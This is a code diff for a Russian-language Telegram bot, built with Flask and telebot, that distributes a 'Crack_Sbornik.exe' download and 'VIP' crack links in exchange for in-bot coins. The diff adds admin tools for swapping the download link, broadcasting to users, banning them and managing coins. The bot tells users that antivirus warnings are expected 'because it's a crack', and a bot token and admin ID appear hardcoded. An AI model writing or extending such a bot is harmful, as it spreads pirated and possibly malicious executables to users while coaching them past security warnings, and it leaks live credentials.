@@ -4,8 +4,8 @@ from flask import Flask, request
 import telebot
 from telebot import types
 
-TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"
-ADMIN_ID = 7859226148
+TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ⚠️ ЗАМЕНИТЕ НА НОВЫЙ ТОКЕН!
+ADMIN_ID = 7859226148  # ⚠️ ЗАМЕНИТЕ НА СВОЙ ID
 
 SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
 IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"
@@ -28,6 +28,7 @@ COINS_FILE = "coins.txt"
 MESSAGES_FILE = "messages.txt"
 BLACKLIST_FILE = "blacklist.txt"
 
+# =============== ФУНКЦИИ СОХРАНЕНИЯ ===============
 def save_coins():
     with open(COINS_FILE, 'w') as f:
         for uid, coins in coins_data.items():
@@ -45,7 +46,7 @@ def load_coins():
 def save_messages():
     with open(MESSAGES_FILE, 'w') as f:
         for uid, data in message_tracker.items():
-            f.write(f"{uid}|{data['count']}|{data['name']}\n")
+            f.write(f"{uid}|{data['count']}|{data.get('name', '')}|{data.get('username', '')}\n")
 
 def load_messages():
     global message_tracker
@@ -54,8 +55,12 @@ def load_messages():
             for line in f:
                 if line.strip():
                     parts = line.strip().split('|')
-                    if len(parts) == 3:
-                        message_tracker[int(parts[0])] = {"count": int(parts[1]), "name": parts[2]}
+                    if len(parts) >= 2:
+                        uid = int(parts[0])
+                        count = int(parts[1])
+                        name = parts[2] if len(parts) > 2 else ""
+                        username = parts[3] if len(parts) > 3 else ""
+                        message_tracker[uid] = {"count": count, "name": name, "username": username}
 
 def save_blacklist():
     with open(BLACKLIST_FILE, 'w') as f:
@@ -68,6 +73,7 @@ def load_blacklist():
         with open(BLACKLIST_FILE, 'r') as f:
             blacklist = set(int(l.strip()) for l in f if l.strip())
 
+# =============== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===============
 def get_coins(uid):
     return coins_data.get(uid, 0)
 
@@ -85,11 +91,11 @@ def remove_coins(uid, amount):
 def get_messages(uid):
     return message_tracker.get(uid, {}).get("count", 0)
 
-def add_message(uid, name):
+def add_message(uid, name, username):
     if uid in message_tracker:
         message_tracker[uid]["count"] += 1
     else:
-        message_tracker[uid] = {"count": 1, "name": name}
+        message_tracker[uid] = {"count": 1, "name": name, "username": username or ""}
     save_messages()
 
 def is_banned(uid):
@@ -117,7 +123,7 @@ def start_command(message):
         return
     
     users.add(uid)
-    add_message(uid, message.from_user.first_name)
+    add_message(uid, message.from_user.first_name, message.from_user.username)
     
     if get_coins(uid) == 0:
         add_coins(uid, 100)
@@ -149,8 +155,15 @@ def admin_command(message):
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(
         types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
+        types.InlineKeyboardButton("📝 Сменить ссылку", callback_data="admin_change_link"),
         types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users"),
-        types.InlineKeyboardButton("💰 Монеты", callback_data="admin_coins")
+        types.InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast"),
+        types.InlineKeyboardButton("🖼 Сменить картинку", callback_data="admin_change_image"),
+        types.InlineKeyboardButton("🚫 Забанить пользователя", callback_data="admin_ban"),
+        types.InlineKeyboardButton("✅ Разбанить пользователя", callback_data="admin_unban"),
+        types.InlineKeyboardButton("📋 Список забаненных", callback_data="admin_banlist"),
+        types.InlineKeyboardButton("📊 Трекер сообщений", callback_data="admin_tracker"),
+        types.InlineKeyboardButton("💰 Управление монетами", callback_data="admin_coins")
     )
     bot.send_message(message.chat.id, "🔧 Админ-панель", reply_markup=kb)
 
@@ -170,11 +183,15 @@ def stats_callback(call):
         return
     bot.answer_callback_query(call.id)
     
-    text = f"📊 **Статистика**\n\n"
+    text = f"📊 **Ваша статистика**\n\n"
     text += f"💰 Монеты: {get_coins(uid)}\n"
     text += f"💬 Сообщений: {get_messages(uid)}\n"
     text += f"🆔 ID: {uid}\n"
     text += f"👤 Имя: {call.from_user.first_name}\n"
+    if call.from_user.username:
+        text += f"📱 Username: @{call.from_user.username}\n"
+    text += f"\n🎁 **Как получить монеты?**\n"
+    text += f"• +5 за сообщение\n• +10 за скачивание\n• +50 за жалобу\n• +100 за регистрацию"
     bot.send_message(uid, text, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data == "vip")
@@ -196,7 +213,7 @@ def vip_callback(call):
     
     remove_coins(uid, 1250)
     bot.answer_callback_query(call.id, "✅ Снято 1250 монет!", False)
-    bot.send_message(uid, f"🔝 VIP КРЯКИ\n\n🔗 {VIP_LINK}\n💰 Остаток: {get_coins(uid)}")
+    bot.send_message(uid, f"🔝 **VIP КРЯКИ**\n\n🔗 {VIP_LINK}\n\n💰 Остаток: {get_coins(uid)}", parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: call.data == "download")
 def download_callback(call):
@@ -231,7 +248,7 @@ def more_callback(call):
     update_cd(uid)
     
     bot.answer_callback_query(call.id, "📸", False)
-    bot.send_photo(uid, IMAGE_URL, caption="☢️ антивирус может ругаться на софт")
+    bot.send_photo(uid, IMAGE_URL, caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️")
 
 @bot.callback_query_handler(func=lambda call: call.data == "share")
 def share_callback(call):
@@ -240,7 +257,7 @@ def share_callback(call):
         bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
         return
     bot.answer_callback_query(call.id)
-    bot.send_message(uid, f"👥 Поделиться:\nhttps://t.me/{bot.get_me().username}")
+    bot.send_message(uid, f"👥 Поделиться ботом:\n\nhttps://t.me/{bot.get_me().username}")
 
 @bot.callback_query_handler(func=lambda call: call.data == "report")
 def report_callback(call):
@@ -257,7 +274,7 @@ def report_callback(call):
     
     bot.answer_callback_query(call.id)
     waiting_for_report[uid] = True
-    bot.send_message(uid, "✍️ Напишите текст жалобы\n(/cancel для отмены)")
+    bot.send_message(uid, "⚙️ Отправьте сообщение с жалобой.\n\n(Вы можете отменить командой /cancel)")
 
 # =============== ОБРАБОТКА ЖАЛОБ ===============
 @bot.message_handler(func=lambda m: m.from_user.id in waiting_for_report)
@@ -267,10 +284,122 @@ def handle_report_text(m):
     if uid in waiting_for_report:
         del waiting_for_report[uid]
     
-    add_message(uid, m.from_user.first_name)
+    add_message(uid, m.from_user.first_name, m.from_user.username)
     add_coins(uid, 50)
-    bot.send_message(uid, "✅ Жалоба отправлена! +50 монет")
-    bot.send_message(ADMIN_ID, f"📢 ЖАЛОБА от {m.from_user.first_name} (ID: {uid})\n\n{text}")
+    bot.send_message(uid, "✅ Ваша жалоба отправлена администратору! +50 монет")
+    
+    # Отправляем админу с кнопкой для ответа
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton("💬 Ответить пользователю", callback_data=f"reply_{uid}"))
+    bot.send_message(ADMIN_ID, f"📢 **НОВАЯ ЖАЛОБА!**\n\n👤 От: {m.from_user.first_name}\n🆔 ID: `{uid}`\n📱 Username: @{m.from_user.username if m.from_user.username else 'нет'}\n📝 Текст:\n{text}", parse_mode="Markdown", reply_markup=kb)
+
+# =============== ОТВЕТ НА ЖАЛОБУ ===============
+@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
+def reply_to_user(call):
+    if not is_admin(call.from_user.id):
+        bot.answer_callback_query(call.id, "❌ Нет доступа!", True)
+        return
+    
+    uid = int(call.data.split('_')[1])
+    bot.answer_callback_query(call.id)
+    msg = bot.send_message(call.message.chat.id, f"✏️ Введите ответ для пользователя (ID: {uid}):")
+    bot.register_next_step_handler(msg, lambda m: send_reply(m, uid))
+
+def send_reply(message, uid):
+    reply_text = message.text.strip()
+    try:
+        bot.send_message(uid, f"📢 **Ответ администратора:**\n\n{reply_text}", parse_mode="Markdown")
+        bot.send_message(message.chat.id, f"✅ Ответ отправлен пользователю {uid}")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+
+# =============== АДМИН-ФУНКЦИИ ===============
+def change_link(m):
+    global SOFT_LINK
+    SOFT_LINK = m.text.strip()
+    bot.send_message(m.chat.id, f"✅ Ссылка изменена!\n\n{SOFT_LINK}")
+
+def change_image(m):
+    global IMAGE_URL
+    IMAGE_URL = m.text.strip()
+    bot.send_message(m.chat.id, f"✅ Картинка изменена!\n\n{IMAGE_URL}")
+
+def broadcast_msg(m):
+    text = m.text.strip()
+    success = 0
+    fail = 0
+    bot.send_message(m.chat.id, "📢 Начинаю рассылку...")
+    for uid in users:
+        if is_banned(uid):
+            continue
+        try:
+            bot.send_message(uid, f"📢 **Новость от админа:**\n\n{text}", parse_mode="Markdown")
+            success += 1
+        except:
+            fail += 1
+        time.sleep(0.05)
+    bot.send_message(m.chat.id, f"✅ Рассылка завершена!\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")
+
+def ban_user(m):
+    try:
+        uid = int(m.text.strip())
+        if uid == ADMIN_ID:
+            bot.send_message(m.chat.id, "❌ Нельзя забанить админа!")
+            return
+        blacklist.add(uid)
+        save_blacklist()
+        bot.send_message(m.chat.id, f"✅ Пользователь `{uid}` забанен!", parse_mode="Markdown")
+        try:
+            bot.send_message(uid, "❌ Вы были забанены в этом боте!")
+        except:
+            pass
+    except:
+        bot.send_message(m.chat.id, "❌ Ошибка! Введите ID.")
+
+def unban_user(m):
+    try:
+        uid = int(m.text.strip())
+        if uid in blacklist:
+            blacklist.remove(uid)
+            save_blacklist()
+            bot.send_message(m.chat.id, f"✅ Пользователь `{uid}` разбанен!", parse_mode="Markdown")
+            try:
+                bot.send_message(uid, "✅ Вы были разбанены!")
+            except:
+                pass
+        else:
+            bot.send_message(m.chat.id, f"❌ Пользователь `{uid}` не в чёрном списке.", parse_mode="Markdown")
+    except:
+        bot.send_message(m.chat.id, "❌ Ошибка! Введите ID.")
+
+def add_coins_admin(m):
+    try:
+        parts = m.text.strip().split()
+        uid = int(parts[0])
+        amount = int(parts[1])
+        add_coins(uid, amount)
+        bot.send_message(m.chat.id, f"✅ Добавлено {amount} монет. Баланс: {get_coins(uid)}")
+    except:
+        bot.send_message(m.chat.id, "❌ Ошибка! Введите: ID количество")
+
+def remove_coins_admin(m):
+    try:
+        parts = m.text.strip().split()
+        uid = int(parts[0])
+        amount = int(parts[1])
+        if remove_coins(uid, amount):
+            bot.send_message(m.chat.id, f"✅ Убрано {amount} монет. Баланс: {get_coins(uid)}")
+        else:
+            bot.send_message(m.chat.id, f"❌ Недостаточно монет!")
+    except:
+        bot.send_message(m.chat.id, "❌ Ошибка! Введите: ID количество")
+
+def check_coins_admin(m):
+    try:
+        uid = int(m.text.strip())
+        bot.send_message(m.chat.id, f"💰 Баланс пользователя `{uid}`: {get_coins(uid)} монет", parse_mode="Markdown")
+    except:
+        bot.send_message(m.chat.id, "❌ Ошибка! Введите ID")
 
 # =============== АДМИН-КНОПКИ ===============
 @bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
@@ -281,23 +410,79 @@ def admin_callback(call):
     bot.answer_callback_query(call.id)
     
     if call.data == "admin_stats":
-        bot.send_message(call.message.chat.id, f"📊 Статистика:\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}")
+        bot.send_message(call.message.chat.id, f"📊 **Статистика:**\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}", parse_mode="Markdown")
     
     elif call.data == "admin_users":
-        bot.send_message(call.message.chat.id, f"👥 Всего пользователей: {len(users)}")
+        bot.send_message(call.message.chat.id, f"👥 **Всего пользователей:** {len(users)}", parse_mode="Markdown")
+    
+    elif call.data == "admin_change_link":
+        msg = bot.send_message(call.message.chat.id, "📝 Отправьте новую ссылку:")
+        bot.register_next_step_handler(msg, change_link)
+    
+    elif call.data == "admin_change_image":
+        msg = bot.send_message(call.message.chat.id, "🖼 Отправьте новую ссылку на картинку:")
+        bot.register_next_step_handler(msg, change_image)
+    
+    elif call.data == "admin_broadcast":
+        msg = bot.send_message(call.message.chat.id, "📢 Введите текст для рассылки:")
+        bot.register_next_step_handler(msg, broadcast_msg)
+    
+    elif call.data == "admin_ban":
+        msg = bot.send_message(call.message.chat.id, "🚫 Введите ID пользователя для бана:")
+        bot.register_next_step_handler(msg, ban_user)
+    
+    elif call.data == "admin_unban":
+        msg = bot.send_message(call.message.chat.id, "✅ Введите ID пользователя для разбана:")
+        bot.register_next_step_handler(msg, unban_user)
+    
+    elif call.data == "admin_banlist":
+        if blacklist:
+            lst = "\n".join([str(uid) for uid in blacklist])
+            bot.send_message(call.message.chat.id, f"📋 **Забаненные:**\n\n{lst}", parse_mode="Markdown")
+        else:
+            bot.send_message(call.message.chat.id, "📋 Чёрный список пуст.")
+    
+    elif call.data == "admin_tracker":
+        if not message_tracker:
+            bot.send_message(call.message.chat.id, "📊 Нет данных.")
+            return
+        sorted_users = sorted(message_tracker.items(), key=lambda x: x[1]["count"], reverse=True)[:20]
+        text = "📊 **Топ по сообщениям:**\n\n"
+        for i, (uid, d) in enumerate(sorted_users, 1):
+            name = d.get('username') or d.get('name', str(uid))[:15]
+            text += f"{i}. {name} — {d['count']}\n"
+        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
     
     elif call.data == "admin_coins":
-        bot.send_message(call.message.chat.id, f"💰 Всего монет выдано: {sum(coins_data.values())}")
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        kb.add(
+            types.InlineKeyboardButton("➕ Добавить монеты", callback_data="admin_add_coins"),
+            types.InlineKeyboardButton("➖ Убрать монеты", callback_data="admin_remove_coins"),
+            types.InlineKeyboardButton("🔍 Проверить монеты", callback_data="admin_check_coins"),
+            types.InlineKeyboardButton("🔙 Назад", callback_data="admin_back")
+        )
+        bot.send_message(call.message.chat.id, "💰 **Управление монетами**", parse_mode="Markdown", reply_markup=kb)
 
-# =============== ЗАПУСК ===============
-load_coins()
-load_messages()
-load_blacklist()
+@bot.callback_query_handler(func=lambda call: call.data in ["admin_add_coins", "admin_remove_coins", "admin_check_coins", "admin_back"])
+def coins_handlers(call):
+    if not is_admin(call.from_user.id):
+        bot.answer_callback_query(call.id, "❌ Нет доступа!", True)
+        return
+    bot.answer_callback_query(call.id)
+    
+    if call.data == "admin_back":
+        admin_command(call.message)
+    elif call.data == "admin_add_coins":
+        msg = bot.send_message(call.message.chat.id, "➕ Введите: `ID количество`\nПример: `123456789 100`", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, add_coins_admin)
+    elif call.data == "admin_remove_coins":
+        msg = bot.send_message(call.message.chat.id, "➖ Введите: `ID количество`\nПример: `123456789 50`", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, remove_coins_admin)
+    elif call.data == "admin_check_coins":
+        msg = bot.send_message(call.message.chat.id, "🔍 Введите ID пользователя:")
+        bot.register_next_step_handler(msg, check_coins_admin)
 
-print("✅ Бот запускается...")
-print(f"👥 Загружено пользователей: {len(message_tracker)}")
-print(f"💰 Загружено монет: {len(coins_data)}")
-
+# =============== WEBHOOK ===============
 @app.route(f'/{TOKEN}', methods=['POST'])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
@@ -310,9 +495,17 @@ def index():
     return "Bot is running!"
 
 if __name__ == "__main__":
+    load_coins()
+    load_messages()
+    load_blacklist()
+    
+    print(f"✅ Загружено: {len(coins_data)} с монетами, {len(message_tracker)} пользователей, {len(blacklist)} в ЧС")
+    
     bot.remove_webhook()
     time.sleep(1)
-    bot.set_webhook(url=f"https://bot-tg-1-x4tg.onrender.com/{TOKEN}")
-    print("✅ Webhook установлен")
+    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-x4tg.onrender.com')}/{TOKEN}"
+    bot.set_webhook(url=webhook_url)
+    print(f"✅ Webhook установлен: {webhook_url}")
+    
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
